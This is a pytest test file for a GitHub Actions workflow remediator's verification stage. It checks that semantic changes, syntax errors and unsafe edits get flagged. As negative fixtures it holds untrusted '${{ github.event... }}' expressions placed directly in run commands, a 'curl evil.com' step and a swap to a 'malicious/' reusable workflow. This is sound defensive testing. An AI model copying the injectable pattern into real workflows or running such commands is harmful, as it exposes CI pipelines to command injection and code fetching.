"""
Unit and integration tests for Stage 8: Verification & Certification Framework.
"""

from __future__ import annotations

import pytest
from pathlib import Path
from cst_auto_remediator import remediate_file, verify_output, VerificationContext
from cst_auto_remediator.yaml_cst.parser import parse_yaml
from cst_auto_remediator.yaml_cst.builder import build_cst
from cst_auto_remediator.gha_verify.report import VerificationDecision, InvariantCode
from cst_auto_remediator.gha_verify.passes.semantic_pass import SemanticPass


ROOT = Path(__file__).resolve().parent.parent
TESTING = ROOT / "testing"
INPUTS = TESTING / "inputs"


def test_stage8_certification_success() -> None:
    """Test verification framework successfully certifies a correct remediation pass."""
    path = INPUTS / "multi_step_mixed.yml"
    original_yaml = path.read_bytes().decode("utf-8")

    remediated_yaml, report, context = remediate_file(path, return_context=True)
    assert remediated_yaml is not None

    # Verify output
    verification_report = verify_output(context)

    # Assert PASS decision
    assert verification_report.decision in (VerificationDecision.PASS, VerificationDecision.WARNING)
    assert verification_report.stats.failed_invariants == 0

    # Assert invariant results details
    for res in verification_report.invariant_results:
        assert res.decision in (VerificationDecision.PASS, VerificationDecision.WARNING)


def test_stage8_fail_syntax_validation() -> None:
    """Inject syntactically invalid output YAML and verify it fails with VER001."""
    path = INPUTS / "multi_step_mixed.yml"
    original_yaml = path.read_bytes().decode("utf-8")

    orig_doc, orig_meta = parse_yaml(original_yaml.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)

    # Malformed syntax injection
    remediated_yaml = "invalid: yaml: : : : foo"

    # We cannot construct rem_cst due to syntax failure, so we pass empty or original as dummy
    context = VerificationContext(
        original_yaml=original_yaml,
        remediated_yaml=remediated_yaml,
        original_cst=orig_cst,
        remediated_cst=orig_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=orig_doc,
    )

    report = verify_output(context)
    assert report.decision == VerificationDecision.FAIL
    assert any(f.code == "VER001" for f in report.findings)


def test_stage8_fail_semantic_equivalence() -> None:
    """Inject a semantic mismatch (modified workflow trigger) and verify it fails with VER002."""
    path = INPUTS / "multi_step_mixed.yml"
    original_yaml = path.read_bytes().decode("utf-8")

    orig_doc, orig_meta = parse_yaml(original_yaml.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)

    # Change the trigger from pull_request to push
    remediated_yaml = original_yaml.replace("pull_request:", "push:")

    rem_doc, rem_meta = parse_yaml(remediated_yaml.encode("utf-8"))
    rem_cst = build_cst(rem_doc, rem_meta)

    context = VerificationContext(
        original_yaml=original_yaml,
        remediated_yaml=remediated_yaml,
        original_cst=orig_cst,
        remediated_cst=rem_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=rem_doc,
    )

    report = verify_output(context)
    assert report.decision == VerificationDecision.FAIL
    assert any(f.code == "VER002" for f in report.findings)


def test_stage8_fail_security_remediation() -> None:
    """Inject a security vulnerability into remediated YAML and verify it fails with VER003."""
    path = INPUTS / "multi_step_mixed.yml"
    original_yaml = path.read_bytes().decode("utf-8")

    orig_doc, orig_meta = parse_yaml(original_yaml.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)

    # Set run command to contain untrusted variable without any env variable
    remediated_yaml = original_yaml.replace(
        "run: 'echo \"PR title: $PR_TITLE\"'",
        "run: 'echo \"PR title: ${{ github.event.pull_request.title }}\"'"
    )

    rem_doc, rem_meta = parse_yaml(remediated_yaml.encode("utf-8"))
    rem_cst = build_cst(rem_doc, rem_meta)

    context = VerificationContext(
        original_yaml=original_yaml,
        remediated_yaml=remediated_yaml,
        original_cst=orig_cst,
        remediated_cst=rem_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=rem_doc,
    )

    report = verify_output(context)
    assert report.decision == VerificationDecision.FAIL
    assert any(f.code == "VER003" for f in report.findings)


def test_stage8_fail_structural_sharing_and_cow() -> None:
    """Mock structural sharing/COW identity violations and verify it fails with VER008."""
    path = INPUTS / "multi_step_mixed.yml"
    original_yaml = path.read_bytes().decode("utf-8")

    orig_doc, orig_meta = parse_yaml(original_yaml.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)

    # Use a separately parsed remediated CST so no nodes share python identity
    remediated_yaml, _ = remediate_file(path)
    rem_doc, rem_meta = parse_yaml(remediated_yaml.encode("utf-8"))
    rem_cst = build_cst(rem_doc, rem_meta)

    context = VerificationContext(
        original_yaml=original_yaml,
        remediated_yaml=remediated_yaml,
        original_cst=orig_cst,
        remediated_cst=rem_cst,  # Independent CST object
        original_ruamel=orig_doc,
        remediated_ruamel=rem_doc,
    )

    report = verify_output(context)
    assert report.decision == VerificationDecision.FAIL
    assert any(f.code == "VER008" for f in report.findings)


# =====================================================================
# NEW COMPREHENSIVE TESTS FOR COMPILER UPGRADE (PHASE 6)
# =====================================================================

def check_mismatch(orig: str, rem: str, property_name: str | None = None) -> None:
    """Helper to assert that a semantic mismatch is correctly caught by SemanticPass."""
    orig_doc, orig_meta = parse_yaml(orig.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    
    rem_doc, rem_meta = parse_yaml(rem.encode("utf-8"))
    rem_cst = build_cst(rem_doc, rem_meta)
    
    context = VerificationContext(
        original_yaml=orig,
        remediated_yaml=rem,
        original_cst=orig_cst,
        remediated_cst=rem_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=rem_doc,
    )
    
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    
    found_mismatch = any(f.code == "VER002" for f in findings)
    assert found_mismatch, f"Expected VER002 semantic mismatch finding. Findings: {[f.message for f in findings]}"
    
    if property_name:
        found_prop = any(property_name in f.message for f in findings)
        assert found_prop, f"Expected offending property '{property_name}' in mismatch message. Got: {[f.message for f in findings]}"


def test_stage8_workflow_level_properties() -> None:
    """Verify workflow-level property changes are caught."""
    base = """
name: CI Workflow
on: push
permissions: read-all
defaults:
  run:
    shell: bash
concurrency:
  group: ci
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello"
"""
    # 1. Modify permissions
    rem_permissions = base.replace("permissions: read-all", "permissions: write-all")
    check_mismatch(base, rem_permissions, "permissions")

    # 2. Modify defaults
    rem_defaults = base.replace("shell: bash", "shell: sh")
    check_mismatch(base, rem_defaults, "defaults")

    # 3. Modify concurrency
    rem_concurrency = base.replace("group: ci", "group: main")
    check_mismatch(base, rem_concurrency, "concurrency")

    # 4. Modify name
    rem_name = base.replace("name: CI Workflow", "name: CD Workflow")
    check_mismatch(base, rem_name, "name")


def test_stage8_workflow_trigger_substructure() -> None:
    """Verify trigger substructure changes are recursively caught."""
    base = """
name: CI
on:
  workflow_dispatch:
    inputs:
      debug:
        required: true
        default: 'false'
  workflow_call:
    inputs:
      env:
        required: true
        type: string
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "test"
"""
    # 1. Modify workflow_call inputs
    rem_call = base.replace("type: string", "type: boolean")
    check_mismatch(base, rem_call, "on")

    # 2. Modify workflow_dispatch inputs
    rem_dispatch = base.replace("default: 'false'", "default: 'true'")
    check_mismatch(base, rem_dispatch, "on")


def test_stage8_job_level_properties() -> None:
    """Verify job-level property changes are caught."""
    base = """
name: Job Property Test
on: push
jobs:
  test:
    needs: setup
    runs-on: ubuntu-latest
    permissions: contents/read
    timeout-minutes: 10
    strategy:
      matrix:
        node: [16, 18]
    defaults:
      run:
        shell: pwsh
    outputs:
      status: success
    container:
      image: node:18
    services:
      redis:
        image: redis
    concurrency:
      group: test-job
    environment: production
    continue-on-error: true
    steps:
      - run: echo "test"
"""
    # 1. Modify needs
    rem_needs = base.replace("needs: setup", "needs: test")
    check_mismatch(base, rem_needs, "needs")

    # 2. Modify runs-on
    rem_runs_on = base.replace("runs-on: ubuntu-latest", "runs-on: windows-latest")
    check_mismatch(base, rem_runs_on, "runs-on")

    # 3. Modify permissions
    rem_permissions = base.replace("permissions: contents/read", "permissions: contents/write")
    check_mismatch(base, rem_permissions, "permissions")

    # 4. Modify timeout-minutes
    rem_timeout = base.replace("timeout-minutes: 10", "timeout-minutes: 20")
    check_mismatch(base, rem_timeout, "timeout-minutes")

    # 5. Modify strategy (matrix)
    rem_strategy = base.replace("[16, 18]", "[16, 18, 20]")
    check_mismatch(base, rem_strategy, "strategy")

    # 6. Modify defaults
    rem_defaults = base.replace("shell: pwsh", "shell: bash")
    check_mismatch(base, rem_defaults, "defaults")

    # 7. Modify outputs
    rem_outputs = base.replace("status: success", "status: failed")
    check_mismatch(base, rem_outputs, "outputs")

    # 8. Modify container
    rem_container = base.replace("image: node:18", "image: node:20")
    check_mismatch(base, rem_container, "container")

    # 9. Modify services
    rem_services = base.replace("image: redis", "image: redis:alpine")
    check_mismatch(base, rem_services, "services")

    # 10. Modify concurrency
    rem_concurrency = base.replace("group: test-job", "group: prod-job")
    check_mismatch(base, rem_concurrency, "concurrency")

    # 11. Modify environment
    rem_env = base.replace("environment: production", "environment: staging")
    check_mismatch(base, rem_env, "environment")

    # 12. Modify continue-on-error
    rem_coe = base.replace("continue-on-error: true", "continue-on-error: false")
    check_mismatch(base, rem_coe, "continue-on-error")


def test_stage8_reusable_workflow_uses_and_job_if() -> None:
    """Verify reusable workflow uses and job-level if condition modifications are caught."""
    base = """
name: Reusable Workflow Test
on: push
jobs:
  run-reusable:
    if: github.event_name == 'push'
    uses: octocat/workflows/.github/workflows/reusable.yml@main
"""
    # 1. Modify uses
    rem_uses = base.replace("uses: octocat/workflows/.github/workflows/reusable.yml@main", "uses: malicious/workflows/.github/workflows/reusable.yml@main")
    check_mismatch(base, rem_uses, "uses")

    # 2. Modify job-level if
    rem_if = base.replace("github.event_name == 'push'", "github.event_name == 'pull_request'")
    check_mismatch(base, rem_if, "if")


def test_stage8_job_ordering_and_job_mismatch() -> None:
    """Verify job reordering, addition, or deletion is caught."""
    base = """
name: Multi Job
on: push
jobs:
  jobA:
    runs-on: ubuntu-latest
    steps:
      - run: echo "A"
  jobB:
    runs-on: ubuntu-latest
    steps:
      - run: echo "B"
"""
    # 1. Job reordering
    reordered = """
name: Multi Job
on: push
jobs:
  jobB:
    runs-on: ubuntu-latest
    steps:
      - run: echo "B"
  jobA:
    runs-on: ubuntu-latest
    steps:
      - run: echo "A"
"""
    check_mismatch(base, reordered, "Job keys or order mismatch")

    # 2. Job deletion
    deleted = """
name: Multi Job
on: push
jobs:
  jobA:
    runs-on: ubuntu-latest
    steps:
      - run: echo "A"
"""
    check_mismatch(base, deleted, "Job keys or order mismatch")

    # 3. Job addition
    added = """
name: Multi Job
on: push
jobs:
  jobA:
    runs-on: ubuntu-latest
    steps:
      - run: echo "A"
  jobB:
    runs-on: ubuntu-latest
    steps:
      - run: echo "B"
  jobC:
    runs-on: ubuntu-latest
    steps:
      - run: echo "C"
"""
    check_mismatch(base, added, "Job keys or order mismatch")


def test_stage8_step_modifications() -> None:
    """Verify step addition, deletion, and attribute modifications are caught."""
    base = """
name: Steps Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - id: step1
        name: First step
        uses: actions/checkout@v3
        with:
          fetch-depth: 0
        if: success()
        continue-on-error: true
        timeout-minutes: 5
        shell: bash
        working-directory: ./src
        env:
          MY_VAR: val
        run: echo "test"
"""
    # 1. Modify step uses
    rem_uses = base.replace("uses: actions/checkout@v3", "uses: actions/checkout@v4")
    check_mismatch(base, rem_uses, "uses")

    # 2. Modify step with
    rem_with = base.replace("fetch-depth: 0", "fetch-depth: 1")
    check_mismatch(base, rem_with, "with")

    # 3. Modify step if
    rem_if = base.replace("if: success()", "if: failure()")
    check_mismatch(base, rem_if, "if")

    # 4. Modify step continue-on-error
    rem_coe = base.replace("continue-on-error: true", "continue-on-error: false")
    check_mismatch(base, rem_coe, "continue-on-error")

    # 5. Modify step timeout-minutes
    rem_timeout = base.replace("timeout-minutes: 5", "timeout-minutes: 10")
    check_mismatch(base, rem_timeout, "timeout-minutes")

    # 6. Modify step shell
    rem_shell = base.replace("shell: bash", "shell: sh")
    check_mismatch(base, rem_shell, "shell")

    # 7. Modify step working-directory
    rem_wd = base.replace("working-directory: ./src", "working-directory: ./")
    check_mismatch(base, rem_wd, "working-directory")

    # 8. Modify step name
    rem_name = base.replace("name: First step", "name: Modified step")
    check_mismatch(base, rem_name, "name")

    # 9. Modify step id
    rem_id = base.replace("id: step1", "id: stepA")
    check_mismatch(base, rem_id, "id")

    # 10. Added step
    rem_added = base + "      - run: echo \"extra step\"\n"
    check_mismatch(base, rem_added, "steps length mismatch")

    # 11. Deleted step
    rem_deleted = base.replace('      - id: step1\n        name: First step\n        uses: actions/checkout@v3\n        with:\n          fetch-depth: 0\n        if: success()\n        continue-on-error: true\n        timeout-minutes: 5\n        shell: bash\n        working-directory: ./src\n        env:\n          MY_VAR: val\n        run: echo "test"', '      - run: echo "stub"')
    # Length matches but it's completely different
    check_mismatch(base, rem_deleted)


def test_stage8_run_structural_verification() -> None:
    """Verify run-command transition constraints (Phase 3 structural verification)."""
    base = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        run: echo "${{ github.event.issue.title }}"
"""
    # 1. Valid remediation: replacement of expression with $GD_ISSUE_TITLE and insertion in env.
    valid_remediation = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        env:
          GD_ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "$GD_ISSUE_TITLE"
"""
    # Verify valid remediation passes
    orig_doc, orig_meta = parse_yaml(base.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    rem_doc, rem_meta = parse_yaml(valid_remediation.encode("utf-8"))
    rem_cst = build_cst(rem_doc, rem_meta)
    context = VerificationContext(
        original_yaml=base,
        remediated_yaml=valid_remediation,
        original_cst=orig_cst,
        remediated_cst=rem_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=rem_doc,
    )
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    assert not findings, f"Expected no semantic mismatches. Got: {[f.message for f in findings]}"

    # 2. Invalid: unrelated env insertion (fails Phase 3 constraint)
    unrelated_env = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        env:
          GD_ISSUE_TITLE: ${{ github.event.issue.title }}
          UNRELATED_VAR: ${{ github.event.issue.body }}
        run: echo "$GD_ISSUE_TITLE"
"""
    check_mismatch(base, unrelated_env, "unrelated env variables")

    # 3. Invalid: incorrect/mismatched env mapping (mismatched expression value)
    mismatched_env_val = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        env:
          GD_ISSUE_TITLE: ${{ github.event.issue.body }}
        run: echo "$GD_ISSUE_TITLE"
"""
    check_mismatch(base, mismatched_env_val, "run command was modified invalidly")

    # 4. Invalid: arbitrary run command modifications
    arbitrary_run = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        env:
          GD_ISSUE_TITLE: ${{ github.event.issue.title }}
        run: curl evil.com && echo "$GD_ISSUE_TITLE"
"""
    check_mismatch(base, arbitrary_run, "run command was modified invalidly")

    # 5. Invalid: partial replacement or missing replacement in run command
    partial_replace = """
name: Run Verify Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Command Injection Target
        env:
          GD_ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "${{ github.event.issue.title }}"
"""
    check_mismatch(base, partial_replace, "run command was not modified but unrelated env variables")


def test_stage8_edge_cases() -> None:
    """Verify edge cases like composite actions, anchors/aliases, and matrix include/exclude."""
    # 1. Composite action step (uses but no run)
    composite = """
name: Composite
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Sub-action
        uses: ./my-action
"""
    orig_doc, orig_meta = parse_yaml(composite.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    context = VerificationContext(
        original_yaml=composite,
        remediated_yaml=composite,
        original_cst=orig_cst,
        remediated_cst=orig_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=orig_doc,
    )
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    assert not findings, f"Expected no semantic mismatches. Got: {[f.message for f in findings]}"

    # 2. Anchors & Aliases
    anchors = """
name: Anchors
on: push
jobs:
  build:
    runs-on: &runner-spec ubuntu-latest
    steps:
      - name: Checkout
        run: echo "test"
  test:
    runs-on: *runner-spec
    steps:
      - name: Test
        run: echo "test"
"""
    orig_doc, orig_meta = parse_yaml(anchors.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    context = VerificationContext(
        original_yaml=anchors,
        remediated_yaml=anchors,
        original_cst=orig_cst,
        remediated_cst=orig_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=orig_doc,
    )
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    assert not findings, f"Expected no semantic mismatches. Got: {[f.message for f in findings]}"

    # 3. Nested matrices with include/exclude
    matrix = """
name: Matrix Test
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [16, 18]
        os: [ubuntu-latest, windows-latest]
        include:
          - node: 20
            os: macos-latest
        exclude:
          - node: 16
            os: windows-latest
    steps:
      - run: echo "hello"
"""
    orig_doc, orig_meta = parse_yaml(matrix.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    context = VerificationContext(
        original_yaml=matrix,
        remediated_yaml=matrix,
        original_cst=orig_cst,
        remediated_cst=orig_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=orig_doc,
    )
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    assert not findings, f"Expected no semantic mismatches. Got: {[f.message for f in findings]}"


def test_stage8_empty_workflows() -> None:
    """Verify empty/null workflows are handled correctly by the verifier."""
    empty = "{}"
    orig_doc, orig_meta = parse_yaml(empty.encode("utf-8"))
    orig_cst = build_cst(orig_doc, orig_meta)
    context = VerificationContext(
        original_yaml=empty,
        remediated_yaml=empty,
        original_cst=orig_cst,
        remediated_cst=orig_cst,
        original_ruamel=orig_doc,
        remediated_ruamel=orig_doc,
    )
    findings = []
    invariant_results = []
    SemanticPass().run(context, findings, invariant_results)
    assert not findings, f"Expected no semantic mismatches. Got: {[f.message for f in findings]}"
